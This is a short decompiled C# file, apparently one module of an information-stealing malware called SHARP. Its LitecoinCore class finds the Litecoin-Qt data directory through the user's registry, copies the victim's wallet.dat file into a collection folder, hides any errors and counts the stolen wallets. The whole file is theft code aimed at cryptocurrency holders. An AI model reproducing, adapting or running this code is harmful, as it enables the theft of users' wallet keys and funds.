﻿using System;
using System.IO;
using Microsoft.Win32;

namespace SHARP
{
	// Token: 0x02000036 RID: 54
	internal class LitecoinCore
	{
		// Token: 0x06000107 RID: 263 RVA: 0x000062FC File Offset: 0x000044FC
		public static void LitecStr(string directorypath)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt");
				Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
				File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
				LitecoinCore.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000084 RID: 132
		public static int count;
	}
}
